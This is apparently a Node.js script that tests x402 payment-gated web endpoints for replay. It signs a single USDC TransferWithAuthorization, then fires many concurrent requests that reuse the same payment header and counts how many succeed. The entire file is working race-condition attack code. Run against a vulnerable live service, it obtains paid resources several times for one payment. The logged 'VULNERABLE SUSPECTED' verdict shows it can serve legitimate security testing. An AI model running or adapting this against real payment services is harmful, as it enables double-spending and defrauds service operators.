import fs from "node:fs";
import { ethers } from "ethers";
import "dotenv/config";

const DEFAULT_REQ_HDR_CANDIDATES = [
  "payment-required",
  "x-payment-request",
  "x-payment-required",
];

function padB64(text) {
  const pad = (4 - (text.length % 4)) % 4;
  return text + "=".repeat(pad);
}

function tryParseJson(text) {
  try {
    return JSON.parse(text);
  } catch {
    return null;
  }
}

function b64AnyToUtf8(value) {
  if (value && (value.trim().startsWith("{") || value.trim().startsWith("["))) {
    return value;
  }

  const normalized = padB64(String(value).replace(/-/g, "+").replace(/_/g, "/"));
  try {
    return Buffer.from(normalized, "base64").toString("utf8");
  } catch {
    return Buffer.from(String(value), "base64").toString("utf8");
  }
}

function extractRequirements(response, bodyText, candidates = DEFAULT_REQ_HDR_CANDIDATES) {
  for (const name of candidates) {
    const value = response.headers.get(name);
    if (!value) continue;
    const decoded = b64AnyToUtf8(value);
    const parsed = tryParseJson(decoded);
    if (parsed?.accepts) {
      return { requirements: parsed, via: `header:${name}` };
    }
  }

  const bodyJson = tryParseJson(bodyText);
  if (bodyJson?.accepts) {
    return { requirements: bodyJson, via: "body" };
  }

  return null;
}

function encodePaymentPayload(payload, forceBase64Url = false) {
  const text = JSON.stringify(payload);
  if (forceBase64Url) {
    return Buffer.from(text, "utf8").toString("base64url");
  }
  return Buffer.from(text, "utf8").toString("base64");
}

function randNonce32() {
  return ethers.hexlify(ethers.randomBytes(32));
}

function chainIdFromNetwork(network) {
  const value = String(network ?? "").trim();
  if (value.startsWith("eip155:")) {
    return Number(value.split(":")[1]);
  }

  const lower = value.toLowerCase();
  const map = {
    base: 8453,
    "base-mainnet": 8453,
    "base-sepolia": 84532,
    base_testnet: 84532,
    ethereum: 1,
    sepolia: 11155111,
    "8453": 8453,
    "84532": 84532,
    "1": 1,
    "11155111": 11155111,
  };
  if (map[lower]) {
    return map[lower];
  }

  if (/^\d+$/.test(lower)) {
    return Number(lower);
  }

  throw new Error(`Cannot infer chainId from network: ${network}`);
}

function buildPaidHeaders({
  version,
  accept,
  authorization,
  signature,
  targetUrl,
  forceBase64Url,
  headerMode = "both",
}) {
  let payload;
  if (version === 1) {
    payload = {
      x402Version: 1,
      scheme: accept.scheme,
      network: accept.network,
      payload: { authorization, signature },
    };
  } else {
    payload = {
      x402Version: 2,
      payload: { authorization, signature },
      resource: { url: targetUrl },
      accepted: accept,
    };
  }

  const encoded = encodePaymentPayload(payload, forceBase64Url);
  if (headerMode === "payment-signature") {
    return {
      "payment-signature": encoded,
    };
  }
  if (headerMode === "x-payment") {
    return {
      "X-Payment": encoded,
    };
  }
  return {
    "payment-signature": encoded,
    "X-Payment": encoded,
  };
}

export async function runX402Race({
  name,
  rpcUrl,
  authorizerKey,
  targetUrl,
  method,
  headers = {},
  body,
  probeMethod = method,
  probeHeaders = headers,
  probeBody = body,
  nReplicas = 10,
  validWindowSec = 10,
  forceBase64Url = false,
  headerMode = "both",
  requirementsHeaderCandidates = DEFAULT_REQ_HDR_CANDIDATES,
  logProbeBodyOnFail = true,
  summaryFile,
} = {}) {
  if (!name) throw new Error("name is required");
  if (!rpcUrl) throw new Error("rpcUrl is required");
  if (!authorizerKey) throw new Error("authorizerKey is required");
  if (!targetUrl) throw new Error("targetUrl is required");
  if (!method) throw new Error("method is required");

  const provider = new ethers.JsonRpcProvider(rpcUrl);
  const authorizer = new ethers.Wallet(authorizerKey, provider);

  console.log(`\n[${name}] Authorizer: ${authorizer.address}`);
  console.log(`[${name}] Target URL:  ${targetUrl}`);
  console.log(`[${name}] Method:      ${method}`);
  console.log(`[${name}] Concurrency: ${nReplicas}`);

  const probeResponse = await fetch(targetUrl, {
    method: probeMethod,
    headers: probeHeaders,
    body: probeMethod === "GET" || probeMethod === "HEAD" ? undefined : probeBody,
  });
  const probeText = await probeResponse.text().catch(() => "");

  const extracted = extractRequirements(probeResponse, probeText, requirementsHeaderCandidates);
  if (!extracted) {
    console.error(`[${name}] Probe status=${probeResponse.status} (requirements not found)`);
    if (logProbeBodyOnFail) {
      console.error(`[${name}] Probe body (first 500 chars):\n${probeText.slice(0, 500)}`);
    }
    throw new Error("No x402 requirements found in headers or body");
  }

  const { requirements, via } = extracted;
  const accept = (requirements.accepts || []).find(
    (item) => item?.scheme === "exact" && String(item?.asset ?? "").startsWith("0x")
  );
  if (!accept) {
    throw new Error(`No usable exact/EVM requirement found in accepts[]: ${JSON.stringify(requirements.accepts ?? [])}`);
  }

  const x402Version = Number(requirements.x402Version ?? 2);
  const chainId = chainIdFromNetwork(accept.network);
  const now = Math.floor(Date.now() / 1000);
  const authorization = {
    from: authorizer.address,
    to: accept.payTo,
    value: String(accept.amount ?? accept.maxAmountRequired),
    validAfter: String(now - 1),
    validBefore: String(now + validWindowSec),
    nonce: randNonce32(),
  };

  const domain = {
    name: accept.extra?.name ?? "USDC",
    version: String(accept.extra?.version ?? "2"),
    chainId,
    verifyingContract: accept.asset,
  };
  const types = {
    TransferWithAuthorization: [
      { name: "from", type: "address" },
      { name: "to", type: "address" },
      { name: "value", type: "uint256" },
      { name: "validAfter", type: "uint256" },
      { name: "validBefore", type: "uint256" },
      { name: "nonce", type: "bytes32" },
    ],
  };

  console.log(`[${name}] Signing reusable authorization. nonce=${authorization.nonce}`);
  const signature = await authorizer.signTypedData(domain, types, authorization);
  const paymentHeaders = buildPaidHeaders({
    version: x402Version,
    accept,
    authorization,
    signature,
    targetUrl,
    forceBase64Url,
    headerMode,
  });

  console.log(`[${name}] Blasting ${nReplicas} requests...`);
  const start = Date.now();
  const results = await Promise.all(
    Array.from({ length: nReplicas }).map(async (_, index) => {
      const response = await fetch(targetUrl, {
        method,
        headers: { ...headers, ...paymentHeaders },
        body: method === "GET" || method === "HEAD" ? undefined : body,
      });
      const text = await response.text().catch(() => "");
      return {
        index,
        status: response.status,
        ok: response.status >= 200 && response.status < 300,
        elapsedMs: Date.now() - start,
        bodyPreview: text.slice(0, 120),
      };
    })
  );

  console.log(`\n[${name}] === Race Results ===`);
  for (const item of results) {
    console.log(
      `[${name}] #${item.index} status=${item.status} t=${item.elapsedMs}ms body="${item.bodyPreview.replace(/\s+/g, " ")}"`
    );
  }

  const successCount = results.filter((item) => item.ok).length;
  const statusCounts = Object.fromEntries(
    Object.entries(
      results.reduce((acc, item) => {
        acc[item.status] = (acc[item.status] ?? 0) + 1;
        return acc;
      }, {})
    ).sort((a, b) => Number(a[0]) - Number(b[0]))
  );

  const summary = {
    phase: "burst_summary",
    service: name,
    targetUrl,
    method,
    probeStatus: probeResponse.status,
    requirementsVia: via,
    x402Version,
    burstSize: nReplicas,
    successCount,
    successRatio: `${successCount}/${nReplicas}`,
    statusCounts,
    authorizer: authorizer.address,
    nonce: authorization.nonce,
    accept: {
      network: accept.network,
      asset: accept.asset,
      payTo: accept.payTo,
      amount: String(accept.amount ?? accept.maxAmountRequired),
    },
    results,
  };

  console.log(`\n[${name}] === Summary ===`);
  console.log(JSON.stringify(summary, null, 2));
  if (successCount > 1) {
    console.log(`[${name}] RESULT: [VULNERABLE SUSPECTED] multiple successes with one authorization`);
  } else {
    console.log(`[${name}] RESULT: [LIKELY SECURE] replay blocked or single issuance`);
  }

  if (summaryFile) {
    fs.writeFileSync(summaryFile, `${JSON.stringify(summary, null, 2)}\n`);
    console.log(`[${name}] summary written to ${summaryFile}`);
  }

  return summary;
}
